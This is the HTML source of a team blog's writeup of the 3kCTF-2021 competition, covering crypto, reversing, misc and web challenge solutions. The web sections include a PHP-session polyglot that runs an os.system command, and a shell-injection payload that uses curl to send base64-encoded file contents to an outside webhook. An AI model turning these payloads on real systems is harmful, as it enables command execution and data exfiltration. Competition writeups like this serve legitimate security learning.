<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>3kCTF-2021 Writeup | Black Bauhinia</title>

<meta name="keywords" content="ctf, 3kctf" />
<meta name="description" content="We are united to play 3kCTF-2021 and result in the second place. In this blog post, we will walk through our solutions on the challenges solved.">
<meta name="author" content="bot_3310, Mystiz, ozetta, TWY">
<link rel="canonical" href="https://b6a.black/posts/2021-05-22-3kctf/" />
<link href="/assets/css/stylesheet.min.79c4dfee3993cd3110886e38d36a5106e0d6922344cefa3ff5c0076f246815f0.css" integrity="sha256-ecTf7jmTzTEQiG4402pRBuDWkiNEzvo/9cAHbyRoFfA=" rel="preload stylesheet"
    as="style">

<link rel="icon" href="https://b6a.black/favicon.ico">

<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.91.0" />




<script async src="https://www.googletagmanager.com/gtag/js?id=G-M67YZZ2MP1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-M67YZZ2MP1');
</script>



<script src="https://kit.fontawesome.com/fbbadced05.js" crossorigin="anonymous"></script>


<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Recursive&display=swap" rel="stylesheet"> 


<meta property="og:title" content="3kCTF-2021 Writeup" />
<meta property="og:description" content="We are united to play 3kCTF-2021 and result in the second place. In this blog post, we will walk through our solutions on the challenges solved." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://b6a.black/posts/2021-05-22-3kctf/" />
<meta property="og:image" content="https://b6a.black/images/2021-05-22-3kctf/solves.png" /><meta property="article:published_time" content="2021-05-22T00:00:00+08:00" />
<meta property="article:modified_time" content="2021-05-22T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://b6a.black/images/2021-05-22-3kctf/solves.png" />
<meta name="twitter:title" content="3kCTF-2021 Writeup"/>
<meta name="twitter:description" content="We are united to play 3kCTF-2021 and result in the second place. In this blog post, we will walk through our solutions on the challenges solved."/>

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "3kCTF-2021 Writeup",
  "name": "3kCTF-2021 Writeup",
  "description": "We are united to play 3kCTF-2021 and result in the second place. In this blog post, we will walk through our solutions on the challenges solved.",
  "keywords": [
    "ctf", "3kctf"
  ],
  "articleBody": "\nWe are united to play 3kCTF-2021 and result in the second place. In this blog post, we will walk through our solutions on the challenges solved.\nSMS (Crypto; 435 points) Solved by Mystiz.\nWe are given a hash algorithm called SMS. The algorithm itself is simple:\ndef hash(data): assert len(data) % 8 == 0 state = [2**i-1 for i in range(1, 9)] for i in range(0, len(data), 8): block = data[i: i+8] state = sub(state) state = mix(block, state) state = shift(state) state = sub(state) return bytes(state).hex() The goal is to find a pair of inputs such that both digests are 00 00 00 00 00 00 00 00. Also, the sub, mix and shift methods are short:\ndef sub(state): return [SBOX[x] for x in state] def mix(block, state): for i in range(8): state[i] ^= block[7 - i] \u0026 0x1f state[i] ^= block[i] \u0026 0xe0 return state def shift(state): t = 0 for s in state: t ^= s u = state[0] for i in range(7): state[i] ^= t ^ state[i] ^ state[i+1] state[7] ^= t ^ state[7] ^ u return state We can implement the inverse functions for sub and shift (i.e., unsub and unshift) easily. With that said, we are able to recover a 8-byte input block with the below recover_payload, given the input and output states:\n# Find the 8-byte input block such that s - t after one round of SMS def recover_payload(s, t): # t = shift(mix(x, sub(s))), where x is the input u = sub(s[:]) v = unshift(t[:]) # v = mix(x, u) x = [0 for _ in range(8)] for i in range(8): x[ i] ^= (u[i] ^ v[i]) \u0026 0xe0 x[7-i] ^= (u[i] ^ v[i]) \u0026 0x1f return x With the above function, it is not difficult to find a pair of messages such that they both hash to eight null bytes:\nt = unsub([0 for _ in range(8)]) x1 = recover_payload([1, 3, 7, 15, 31, 63, 127, 255], t) # x1 = 1d 3f 42 28 3b 54 3c db x2 = recover_payload([1, 3, 7, 15, 31, 63, 127, 255], [0, 0, 0, 0, 0, 0, 0, 0]) + \\ recover_payload([0, 0, 0, 0, 0, 0, 0, 0], t) # x2 = b5 97 ea 80 93 fc 94 73 11 11 11 11 11 11 11 11 Submitting the collision pair to the netcat service, we have the flag. First blood!\n3k{1s_this_even_4_ha$h?_6b3c1686f7bf87} crypto warmup (Crypto; 353 points) Solved by TWY.\nPart I. Analysis Main Function:\nprint(B) # an integer array for i in range(0, len(flag), 3): print(do_magic(flag[i:i+3], B)) The function do_magic and the weird_function_1 called:\ndef weird_function_1(s): return sum([list(map(int,bin(ord(c))[2:].zfill(8))) for c in s], []) def do_magic(OooO, B): return sum(m * b for m, b in zip(weird_function_1(OooO), B)) Obviously B is given. Also, both the functions do_magic and weird_function_1 are deterministic, and the values fed to the argument OooO in the function do_magic are always three-letter strings (the last one may be shorter, but it is just equivalent to the three-letter string with null bytes padded after it), which means each 3-character string can be easily brute-forced. Also we can assume that all characters are ASCII printable (except the null bytes).\nPart II. Solve Script from tqdm import tqdm def weird_function_1(s): return sum([list(map(int,bin(ord(c))[2:].zfill(8))) for c in s], []) def do_magic(OooO, B): return sum(m * b for m, b in zip(weird_function_1(OooO), B)) B = [4267101277, 4946769145, 6306104881, 7476346548, 7399638140, 1732169972, 1236242271, 5109093704, 2163850849, 6552199249, 3724603395, 3738679916, 5211460878, 642273320, 3810791811, 761851628, 1552737836, 4091151711, 1601520107, 3117875577, 2485422314, 1983900485, 6150993150, 2045278518] F = [34451302951, 58407890177, 49697577713, 45443775595, 38537028435, 47069056666, 49165602815, 43338588490, 32970122390] flag = \"\" for i in F: for j in tqdm(range(128 ** 3)): a = j  14 b = (j  7) \u0026 0b1111111 c = j \u0026 0b1111111 if do_magic(chr(a) + chr(b) + chr(c), B) == i: flag += chr(a) + chr(b) + chr(c) break print(flag) Sample Output:\n53%|███████████████▊ | 1108550/2097152 [00:17 Total time: 254 seconds\nPart III. Extra Notes Actually time can be saved if we start from the lowercase character end instead.\na = 127 - (j  14) b = 127 - ((j  7) \u0026 0b1111111) c = 127 - (j \u0026 0b1111111) Sample Output:\n47%|██████████████▌ | 988601/2097152 [00:15 Total time: 37 seconds\nsecure roots (Crypto; 475 points) Solved by Mystiz.\nIn this challenge, there is a service that requires us to sign in. We are given a token for signing in as the guest, and the objective is to sign in as 3k-admin.\nTo be authenticated as $m$, one must provide an integer $r$ and a string $u$ such that\n\\[r^2 \\equiv \\text{SHA256}(m\\ \\|\\ u)\\ (\\text{mod}\\ n),\\]\nwhere $n$ is a product of two primes. The decryption algorithm is implemented below:\ndef decrypt(self, c): p, q = self.private mp = pow(c, (p+1)//4, p) mq = pow(c, (q+1)//4, q) _, yp, yq = xgcd(p, q) r = (yp * p * mq + yq * q * mp) % (self.public) return r def sign(self, m): U = os.urandom(20) c = int(hashlib.sha256(m + U).hexdigest(), 16) r = self.decrypt(c) return (r, int(U.hex(), 16)) The decryption algorithm is implemented in the same way as Wikipedia1 suggested. Does it mean that the signing algorithm is safe? No.\nFor Rabin cryptosystem, the ciphertext are quadradic residues because they are the square of their corresponding plaintexts. However, for the signing algorithm in the challenge, $h := \\text{SHA256}(m\\ \\|\\ u)$ is not necessarily a quadratic residue. In such cases, $r^2 \\not\\equiv h\\ (\\text{mod}\\ n)$.\nFor decrypt, we have $r \\equiv y_p\\cdot p\\cdot m_q + y_q\\cdot q\\cdot m_q\\ (\\text{mod}\\ n)$ with $y_p p + y_q q = 1$.\nTaking modulo $p$, we have $r \\equiv y_p\\cdot q\\cdot m_p\\equiv h^{(p+1)/4}\\cdot q\\cdot q^{-1}\\equiv h^{(p+1)/4} \\ (\\text{mod}\\ p)$. That said, $r^4 \\equiv h^{p+1}\\equiv h^2\\ (\\text{mod}\\ p)$. That implies $r^2 \\equiv \\pm h\\ (\\text{mod}\\ p)$. That implies $r^2 - h \\equiv 0\\ \\text{or}\\ -2h\\ (\\text{mod}\\ p)$. Likewise $r^2 - h \\equiv 0\\ \\text{or}\\ -2h\\ (\\text{mod}\\ q)$.\nAssuming that $r^2 - h\\equiv 0\\ (\\text{mod}\\ p)$ and $r^2 - h\\not\\equiv 0\\ (\\text{mod}\\ q)$, we have\n\\[\\gcd(n, r^2 - h) = p.\\]\nTherefore we are able retrieve a prime factor of $n$. After that, it is easy to forge tokens to sign in as 3k-admin and win the flag.\nCTF{f4ulty_s1gn4ture_f41l} online_compiler (Web; 425 points) Solved by ozetta.\nThe web service allows you to create a PHP file and execute a file in PHP or Python.\n@app.route('/save',methods = ['POST']) @cross_origin() def save(): c_type=request.form['c_type'] print('ctype-('+c_type) if (c_type == 'php'): code=request.form['code'] if (len(code)100): filename=get_random_string(6)+'.php' path='/home/app/test/'+filename f=open(path,'w') f.write(code) f.close() return filename else: return 'failed' \"\"\"elif (c_type == 'python'): code=request.args.get('code') if (len(code)filename=get_random_string(6)+'.py' path='/home/app/testpy/'+filename f=open(path,'w') f.write(code) f.close() return filename else: return 'failed'\"\"\" The file creation part is straightforward. It allows you to create a php file with length less than 100. The comment part looks suspicious and many players asked whether the challenge design is wrong. Because the file will be executed later, at a first glance I thought it is asking us to write a polygot for php and python. But apparently it is not the case:\n@app.route('/compile',methods = ['POST']) @cross_origin() def compile(): c_type=request.form['c_type'] filename=request.form['filename'] if (c_type == 'php'): if (filename[-3:]=='php'): if (check_file('/home/app/test/'+filename)): path='/home/app/test/'+filename cmd='php -c php.ini '+path p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE) stdout, stderr = p.communicate() return stdout else: return 'failed' else: return 'noop' elif (c_type == 'python'): if (filename[-2:]=='py'): if (check_file('/home/app/test/'+filename)): cmd='python3 '+filename p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE) stdout, stderr = p.communicate() return stdout else: return 'failed' else: return 'noop' The Python part got a filename checking, but interestingly instead of checking .py, it only checks py. As expected, the PHP part got a lot of restriction on disable_functions and disable_classes, so we cannot directly write a py file through functions like file_put_contents. By running array_diff with the list of disable_functions and get_defined_functions()[\"internal\"], it shows a bunch of session-related functions. So apparently we need to create a session file that is executable by Python. Somehow it is a kind of polygot as well...\nFinal payload:\nphp session_id('creepy');session_start();$_SESSION[\"__import__('os').system('ls /')#\"]=1; The session file it creates will look like this:\n__import__('os').system('ls /')#|i:1; The # is important to comment out the stuff afterwards. Then reuse the script in the UI:\n$.post(\"http://\"+location.hostname+\":5000/compile\", { c_type: \"python\", filename: \"../../../../tmp/sess_creepy\" },function(data,status){ document.getElementById(\"aab\").innerHTML=data; }) Emoji (Web; 438 points) Solved by ozetta.\nThe web service will fetch a list of images and sign them to get a MAC. A user can request downloading the image, which will trigger a command execution. At a first glance it needs trick like length extension attack to spoof the MAC but it is using hmac instead of pure sha256. But in fact it will sign any resource fetched by the service:\nfunction fetch_and_parse($page){ $a=file_get_contents(\"https://raw.githubusercontent.com/3kctf2021webchallenge/downloader/master/\".$page.\".html\"); preg_match_all(\"/\\\"(.*?)\\\"/\", $a,$ma); return $ma; } And it could be spoofed like this:\nhttp://emoji.2021.3k.ctf.to/?dir=../../../ozetta/reponame/main/filename\nThe vulnerability is actually similar to this one 😏:\nhttps://web.archive.org/web/20201118140207/https://app.crackingthecryptic.com/sudoku/?puzzleid=..%2F..%2Fsudoku-sandbox-escape.appspot.com%2Fo%2Fpasswd\nThe difference is the challenge uses Github but CTC used Firebase previously, and both of them are serving the resource in the form https://domain/username/resource, so by using directory traversal, one can easily point the resource from the owner's account to the attacker's account.\nThen we can obtain a valid token by putting some images in the form of  on the page. We can now go for the command execution part:\n$d = \"bash -c \\\"curl -o /dev/null \".escapeshellarg(\"https://raw.githubusercontent.com/3kctf2021webchallenge/downloader/master/\".$url).\" \\\"\"; The bash -c is suspicious, and escapeshellarg only handles single quote but not double quote. By injecting double quote we can execute arbitrary commands:\n\";curl webhook -d z=$(grep 3k{ index.php|base64);#\" Crackme (Reverse; 470 points) Solved by cdemirer, ozetta and Mystiz.\nThis writeup is written by Mystiz because cdemirer is busy having his exams. However, Mystiz knew almost nothing about the challenge.  Part I. Kickstarting the Challenge We are provided a VM-type binary where the instructions is also inscribed in the binary (stored in byte_1040). The first 64 bytes being:\n06 00 00 06 01 01 06 02 02 06 03 03 03 00 00 03 01 00 03 02 00 03 03 00 08 00 00 05 00 01 08 00 00 05 00 02 08 00 00 05 00 03 08 00 00 06 00 04 06 01 05 06 02 06 06 03 07 03 00 00 03 01 00 03 When we try to execute the binary, we are asked to enter the flag. Let's try to send something in:\n$ ./crackme Enter the flag: ctf{THi5_FL46_I5_lE91t_4ND_Y0UR_CHeCK3R_SUXx\u0026} Good Job We are done!\nHowever, unfortunately, the scoreboard does not accept our flag... Why? Let's look at the binary in detailed.\nPart II. Reversing the Virtual Machine At suggested in sub_93A, each instruction consists of three bytes. The first byte is the opcode, and the rest are the parameters. There are 14 opcodes supported:\nInstruction Description ----------- ----------- 01 A B REG[A] *= B 02 A B REG[A] -= B 03 A B REG[A] = ~REG[A] 04 A B REG[A] ^= MEM[B] 05 A B REG[A] = REG[B] 06 A B REG[A] = MEM[B] 07 A B IF REG[0] != 0: IP += A 08 A B putc(REG[0]) 09 A B exit(REG[0]) 10 A B REG[0] = getc() 11 A B REG[A]  There are 2137 bytes in byte_1040. The first 2048 bytes are the instructions and the remaining 89 bytes are the memory (first eight bytes being ba 91 8b 9a 8d df 8b 97). Moreover, there are four bytes for the register. Note that IP above represents the instruction pointer, which will be increased by 3 unless IP += A is triggered. Notably, IP never decreases.\nWith that, let's try to understand the first few instructions:\n06 00 00 REG[0] = MEM[0] // REG[0] = 0xba 06 01 01 REG[1] = MEM[1] // REG[1] = 0x91 06 02 02 REG[2] = MEM[2] // REG[2] = 0x8b 06 03 03 REG[3] = MEM[3] // REG[3] = 0x9a 03 00 00 REG[0] = ~REG[0] // REG[0] = 0x45 03 01 00 REG[1] = ~REG[1] // REG[1] = 0x6e 03 02 00 REG[2] = ~REG[2] // REG[2] = 0x74 03 03 00 REG[3] = ~REG[3] // REG[3] = 0x65 08 00 00 putc(REG[0]) // Prints \"E\" 05 00 01 REG[0] = REG[1] // REG[0] = 0x6e 08 00 00 putc(REG[0]) // Prints \"n\" ... Part III. Here Comes the Angry Solvers cdemirer made an Angr-compatible version and ran against Angr. He got a flag that passes the check in no time:\nctf{dsdsdddddddasdadsdsddaddddaddddddsddsssds} The flag is accepted in the original binary. However, the scoreboard does not accept it. What was happening? Let's look at the first instructions those are called since the binary is reading bytes (denote the bytes being x0, x1, ...) from the user.\n 186 | REG[0] = getc() // REG[0] = x0 189 | REG[0] ^= MEM[16] // REG[0] = x0 ^ 0x63 192 | REG[3] += REG[0] // REG[3] = x0 ^ 0x63 195 | REG[0] = getc() // REG[0] = x1 198 | REG[0] ~= REG[0] // REG[0] = x1 ^ 0xff 201 | REG[0] ^= MEM[17] // REG[0] = x1 ^ 0x74 204 | REG[3] += REG[0] // REG[3] = (x0 ^ 0x63) + (x1 ^ 0x74) 207 | REG[0] = getc() // REG[0] = x2 210 | REG[1] = REG[0] // REG[1] = x2 213 | REG[0] ^= MEM[18] // REG[0] = x2 ^ 0x8a 216 | REG[1] \u0026= MEM[18] // REG[1] = x2 \u0026 0x8a 219 | REG[1]  Coincidentally, there is an assignment to REG[3] before each getc() operations. If we assume that those REG[3] to be zero, we will find something surprising. That is:\nx0, x1, x2, x3 = 0x63, 0x74, 0x66, 0x7b which reads ctf{. Eventually, if we proceed with the assumption, we have the flag: ctf{vErtu4l_m4chine_pr0tection_is_soo_2010_xD}. Fixing some of the spelling mistakes we have the actual flag:\nctf{v1rtu4l_m4chine_pr0tection_is_soo_2010_xD} The checks are not strict. There are non-unique solutions being accepted to the checker. Alas, the other reversing challenges we solved are checking our input in a similar fashion, too. This is not a good sign…  Imposter (Web; 485 points) Solved by ozetta.\nI spent a lot of time in this question not because my bug-radar is not working but because of the broken bot. I have to keep being tortured by the unpleasant reCAPTCHA. I started this challenge at around 9:30 pm Saturday local time, and found the bug very quickly (?) in around 20 minutes:\nhttp://imposter.2021.3k.ctf.to/view/posts.php/?token=czoyNToiPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiI7 First, the token is specifying the post object created by the user. As expected the post content is sanitized. But the token handling part is funny:\nif (!empty($_GET['token'])){ try {\t$result = unserialize(base64_decode($_GET['token']))-get_post(); } catch (Error $e) { echo unserialize(base64_decode($_GET['token'])); } } It will show the unserialized object when error occurs. You know a string does not have a method called get_post(), right? So just serialize a string and base64 encode it as the token and make arbitrary payload. But if we use the original view post page, it will be blocked by CSP:\nhttp://imposter.2021.3k.ctf.to/view/posts.php?token=czoyNToiPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiI7 which is due to the CSP created by . By using the Relative Path Overwrite (RPO, not ROP), we can get rid of that file. Note that both view//posts.php and view/posts.php/ work, but not /view/posts.php because /view/../js/main.js = /js/main.js is still valid while the other two will give view/js/main.js instead.\nAfter half an hour, I started bombard the author for the bot issue:\n\nOK things didn't go well. Let's try another author:\n\nFinally they took down the challenge to increase the resources at around 12:30 am Sunday local time. Maybe time to sleep? Well we decided to get some popcorn:\n\nThen I went to sleep at around 2 am. But I got woke up by my teammate later at 3:11 am to submit the payload:\n 🥶 Haiya time to sleep ar.\nBy the way, because the bot only accepts URL in the form view/posts.php?token={...}, we need to first use the meta refresh trick (which is not blocked by CSP) to kick the victim to the XSS page and steal the cookie. The detailed payload is left as an exercise for the readers.\nDigital (Crypto; 493 points) Solved by Mystiz.\nWe are given the parameters for digital signature algorithm (DSA):\n The modulus $p$ and the generator $g$ are around 2048 bits, and the order $q$ is 256 bits long.  On top of that, we are also given two pairs of DSA message-signature pairs, where the private key owner signs consecutively. One point worth noticing is that they are using a hand-crafted PRNG. The PRNG is seeded by 8 bytes from urandom:\nclass Random(): def __init__(self, seed): self.state = seed self.bits = self.state.bit_length() def next(self): self.state ^= self.state  76 self.state = rol(self.state, 32, self.bits) self.state ^= self.state  104 self.state = rol(self.state, 20, self.bits) self.state ^= self.state  116 self.state = rol(self.state, 12, self.bits) return self.state random = Random(int(os.urandom(8).hex(), 16)) Since their PRNG involves of xor's and rol's only, we can express the current and the next states (denoted by $k_1$ and $k_2$) explicitly:\n\\[\\begin{aligned} k_2 \u0026= \\text{ROL}(k_1, 64) \\oplus \\text{ROL}(k_1^{52..0}, 12) \\oplus \\text{ROL}(k_1^{24..0}, 32) \\\\ \u0026\\qquad \\oplus \\text{ROL}(k_1^{20..0}, 36) \\oplus k_1^{88..76} \\oplus k_1^{12..0} \\end{aligned}\\]\nWe can visualize the components for the next state in terms of the current state. We can see that $k_2^{128..64} = k_1^{64..0}$. That said, $k_1$ and $k_2$ share 64 bits of entropy, and they have 192 bits entropy in total.\n\nIn that way, we can write $k_1 := 2^{64} u + v$ and $k_2 := 2^{64} v + w$. Also, we have two pairs of message-signature pairs: $m_i$ and $r_i, s_i$'s which satisfy the below congruence (here $x$ is the secret flag):\n\\[k_is_i \\equiv h_i + xr_i\\ (\\text{mod}\\ q).\\]\nWe can eliminate $x$ by multiplying $r_2$ on the both sides of $k_1s_1 \\equiv h_1 + xr_1$ and multiplying $r_1$ on $k_2s_2 \\equiv h_2 + xr_2$. Eventually we can form a large congruence under modulo $q$:\n\\[k_1s_1r_2 - k_2s_2r_2 \\equiv h_1r_2 - h_2r_1\\ (\\text{mod}\\ q).\\]\nIn that way, the only unknowns are $k_1$ and $k_2$. Substituting $k_1 = 2^{64}u+v$ and $k_2 = 2^{64}v+w$, we have\n\\[2^{64}s_1r_2u + (- 2^{64}s_2r_1 + s_1r_2)v - s_2r_1w \\equiv h_1r_2-h_2r_1\\ (\\text{mod}\\ q).\\]\nWe can construct a lattice and use the LLL algorithm to find short vectors. The vector we want is $(0, -1, u, v, w)$.\nb = h1*r2 - h2*r1 a0 = 2**64 * s1*r2 a1 = -2**64 * s2*r1 + s1*r2 a2 = -s2*r1 A = Matrix(ZZ, [ [ b, 1, 0, 0, 0], # [a0, 0, 1, 0, 0], # [a1, 0, 0, 1, 0], # [a2, 0, 0, 0, 1], # [ q, 0, 0, 0, 0], # * ]) Q = diagonal_matrix([2**64, 2**64, 1, 1, 1]) A *= Q A = A.LLL() A /= Q We are able to retrieve the flag with the above Sage snippet - and we agreed that we should not roll our own PRNG algorithms.\n3k{Why_roll_your_0wn_random_???} Mokdad's Memories (Misc; 498 points) Solved by TWY.\nPart I. Analysis We are given a Python source code that takes el_mok.png as the input and outputs an image named brain_memory.png, and a remote service nc mokdadkey.2021.3k.ctf.to 1777.\nAs the source code states that the dimension of brain_memory.png is $887\\times499$, while the given brain_memory.png is $887\\times22$, probably something has been done to the original brain_memory.png.\n It may be a cropped part of the \"brain memory\", or The dimension may be corrupted, or Other reason(s) that needs further investigation  In either of the first two cases, we know that the relative offsets between the pixels of the visible parts ($887\\times22$) are fixed.\nSince the given brain_memory.png can be loaded in MSPaint, but result in Internal Error in SAI2, we can deduce that the file has some sorts of errors.\nTo allow the file to be loaded by Python PIL library properly, we can use some more tolerant image editing software (e.g. GIMP / paint.net) that preserves transparency to open the file, then export to another png file for our use (suppose that the challenge does not have steganography involved, as stated in Home - About).\n This png file exported has much smaller size (About 76 KB) than the original file (About 1.7 MB), and $\\frac{1.7 \\text{MB}}{76 \\text{KB}} \\approx \\frac{499}{22}$, maybe we can confirm something…?  Part II. Reversing the Source Code Since the source code is given, we can try to reverse all the steps to obtain part(s) of the el_mok.png.\n# Source fffmok.save(\"brain_memory.png\") # Reverse fffmok = Image.open(\"brain_memory.png\")# Source fffmok = Image.new(\"RGBA\", (887, 499)) pixels = fffmok.load() itr = 0 for y in range(887): # Brain of Mekdad is so old not knowing how to save his memories :-( for x in range(499): pixels[y, x] = fffmok_pixels[itr] itr += 1 # Reverse fffmok_pixels = [] for y in range(887): for x in range(499): fffmok_pixels.append(fffmok.getpixel((y, x))) # or shorter: fffmok_pixels = [fffmok.getpixel((y, x)) for y in range(887) for x in range(499)] # or even: from PIL.Image import TRANSPOSE fffmok.transpose(TRANSPOSE).tobytes() # notice that this method produces a byte-string instead of a tuple array, so there are some changes needed in order to have the solve script compatible with this.# Source key = bytes_to_long(b\"REDACTED\") # Mekdad will give you the key fffmok_pixels = [] for i in range(0, len(ffmok_bytes) - 4, 8): p = bytes_to_long(ffmok_bytes[i:i+8]) v = (key ^ p) % 18446744073709551615 o2 = v \u0026 0xff b2 = (v  8) \u0026 0xff g2 = (v  16) \u0026 0xff r2 = (v  24) \u0026 0xff o1 = (v  32) \u0026 0xff b1 = (v  40) \u0026 0xff g1 = (v  48) \u0026 0xff r1 = (v  56) \u0026 0xff fffmok_pixels.append((r1, g1, b1, o1)) fffmok_pixels.append((r2, g2, b2, o2)) fffmok_pixels.append(tuple(ffmok_bytes[-4:])) This part transforms the bytes using the xor-mod operation using the key.\nFor the key, it states that Mekdad will give you the key. So we should use the netcat service to ask Mekdad for the key.\n$ nc mokdadkey.2021.3k.ctf.to 1777 My number 'n' is 1 84 My number is smaller than 84 Guess 42 My number is smaller than 42 Guess 21 My number is smaller than 21 Guess 10 My number is smaller than 10 Guess 5 Correct, Me Mekdad Shili the President of the Artists Syndicate! As promised here is my secret: '_D3f1nItEly_giV3_IT_@_Sh0T_th1s_Is_n0T_4rT_BuT_th3_3aRt_0f_m3kD4d_sH1Li_' A simple binary search can solve this, as the number of guesses allowed seems to be calculated by $\\lceil \\log_2n\\rceil$.\nSo here we obtained the key: _D3f1nItEly_giV3_IT_@_Sh0T_th1s_Is_n0T_4rT_BuT_th3_3aRt_0f_m3kD4d_sH1Li_. (without the single quotation marks, can be confirmed in later stage if we find the final image looks like random noises).\nThe next problem is to reverse the v = (key ^ p) % 18446744073709551615 part, where $18446744073709551615 = 2^{64}-1$, and $p$ is 64-bit.\nWhich means that $\\text{key} \\oplus p$ only differs from $\\text{key}$ in the lower 64 bits. Therefore, the lower bound of $\\text{key} \\oplus p$ is the result of changing all the lower 64 bits of $\\text{key}$ to 0.\nSince $v$ is the given remainder after the modulo operation, so $\\text{key} \\oplus p$ should be the next number $\\geq$ lower bound that have a remainder of $v$ after divided by $18446744073709551615$. (Actually there are two possible $p$'s if the lower bound satisfies $v$ (then the upper bound also), but the probability is neglectably low so we can just ignore that :) )\n# Reverse key = bytes_to_long(b\"_D3f1nItEly_giV3_IT_@_Sh0T_th1s_Is_n0T_4rT_BuT_th3_3aRt_0f_m3kD4d_sH1Li_\") key_mask_length = (18446744073709551615).bit_length() # 64 key_low64 = key \u0026 (2 ** key_mask_length - 1) key_mask64 = key ^ key_low64 ffmok_bytes = b\"\" for i in range(0, len(fffmok_pixels) - 1, 2): r1, g1, b1, o1 = fffmok_pixels[i] r2, g2, b2, o2 = fffmok_pixels[i + 1] v = bytes_to_long(bytes([r1, g1, b1, o1, r2, g2, b2, o2])) p = ((key_mask64 - (key_mask64 - v) % 18446744073709551615) + 18446744073709551615) ^ key # assert (p ^ key) % 18446744073709551615 == v ffmok_bytes += p.to_bytes(8, \"big\") ffmok_bytes += bytes(fffmok_pixels[-1])# Source fmok_bytes = b\"\".join(map(bytearray, fmok_pixels)) k = (int(\"\".join([hex(_)[2:] for _ in iv]), 16) ** 4).to_bytes(32, \"little\") # b'\\x10\\x82u\\x98:\\x1c\\x0fy\\x10/4{\\xd8\\xc3\\xa9u\\xe3x\\x8a\\x9d3ru\\xc1\\x93\\xf5i\\x8c6\\xdf\\x15\\x01' iv = b'\\xbb\\x9c\\xe2\\x8d\\xd0\\xd1\\xbe@\\xf6l\\x02\\xc95\\x15\\x1cF' aes = AES.new(k, AES.MODE_CBC, iv) ffmok_bytes = aes.encrypt(fmok_bytes[:-4]) + fmok_bytes[-4:] # Reverse k = b'\\x10\\x82u\\x98:\\x1c\\x0fy\\x10/4{\\xd8\\xc3\\xa9u\\xe3x\\x8a\\x9d3ru\\xc1\\x93\\xf5i\\x8c6\\xdf\\x15\\x01' iv = b'\\xbb\\x9c\\xe2\\x8d\\xd0\\xd1\\xbe@\\xf6l\\x02\\xc95\\x15\\x1cF' aes = AES.new(k, AES.MODE_CBC, iv) fmok_bytes = aes.decrypt(ffmok_bytes[:-4]) + ffmok_bytes[-4:] fmok_pixels = [[fmok_bytes[i+j] for j in range(8) if i + j  len(fmok_bytes)] for i in range(0, len(fmok_bytes), 8)] Notice that k is the \"iv (in big endian) raised to the 4th power (i.e. squared twice)\" in little endian.\nTherefore, the iv can be recovered by:\niv = tuple(long_to_bytes(int(isqrt(isqrt(int.from_bytes(k, 'little')))))) # iv = tuple(b\"ASDFQWER\")# Source iv = (X, X, X, X, X, X, X, X) # Of course it's REDACTED prev = iv fmok_pixels = [] for i in range(0, len(mok_bytes), 8): prev = tuple(map(lambda x, y: x ^ y, mok_bytes[i:i+8], prev)) fmok_pixels.append(prev) # Reverse iv = tuple(long_to_bytes(int(isqrt(isqrt(int.from_bytes(k, 'little')))))) prev = iv mok_bytes = b\"\" for i in fmok_pixels: appending = bytes(map(lambda x, y: x ^ y, i, prev)) # assert tuple(map(lambda x, y: x ^ y, appending, prev)) == tuple(i) mok_bytes += appending prev = tuple(i)# Source mok = Image.open(\"el_mok.png\") mok_bytes = mok.tobytes() # Reverse mok = Image.frombytes('RGBA', (887,499), mok_bytes, 'raw') mok.save(\"el_mok.png\") We actually cannot figure out the dimensions of el_mok.png from the source code. But considering the source code looks like encryption, and both $887$ and $499$ are primes, we can first assume that el_mok.png is also $887\\times499$ unless we find the resulting image misaligned.\nWe can test the reversed source code for the fixed(?) brain_memory.png, leaving all the unseen part as black or any color. (Due to the action of per-block xor-mod and the property of CBC block cipher decryption mode, the unknown bytes should not propagate beyond the neighbouring blocks.)\n\nWe can already notice a man in the middle of this image, but since most parts are unknown, maybe the sources have already provided enough details but something is hidden?\nPart III. Finding out the Culprit Summary. This png file exported has much smaller size (About 76 KB) than the original file (About 1.7 MB), and $\\frac{1.7 \\text{MB}}{76 \\text{KB}} \\approx \\frac{499}{22}$, maybe we can confirm something …?  Yes, all the pixels ($887\\times499$) are actually included in brain_memory.png, the only problem is that the dimension is not probably set (modified in some ways).\nBy checking the W3 specification2 of PNG file, we can know that the height is the 5th to the 8th bytes after the start of IHDR chunk. (The 1st to the 4th bytes are the width)\n00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452 .PNG........IHDR 00000010: 0000 0377[0000 0016]0806 0000 0063 7365 ...w.........cse So we directly modify 00000016 (22) to 000001f3 (499) to see if it works.\nMSPaint: Success SAI2: Internal Error GIMP: Error paint.net: Success So we can just use paint.net to fix the remaining parts by exporting the image rendered by it.\nPart IV. Completing the Source Code Here we try our reversed program to the \"fixed image\":\nfrom PIL import Image from Crypto.Util.number import bytes_to_long, long_to_bytes from Crypto.Util.Padding import pad, unpad from gmpy2 import isqrt from Crypto.Cipher import AES # for the first attempt to recover using the 887 x 22 image # fffmok = Image.open(\"brain_memory.png\") # # fffmok_pixels_rev = [] # for y in range(887): # for x in range(499): # fffmok_pixels_rev.append(fffmok.getpixel((y, x)) if x fffmok = Image.open(\"brain_memory.png\") fffmok_pixels_rev = [] for y in range(887): for x in range(499): fffmok_pixels_rev.append(fffmok.getpixel((y, x))) key = bytes_to_long(b\"_D3f1nItEly_giV3_IT_@_Sh0T_th1s_Is_n0T_4rT_BuT_th3_3aRt_0f_m3kD4d_sH1Li_\") key_mask_length = (18446744073709551615).bit_length() key_low64 = key \u0026 (2 ** key_mask_length - 1) key_mask64 = key ^ key_low64 ffmok_bytes_rev = b\"\" for i in range(0, len(fffmok_pixels_rev) - 1, 2): 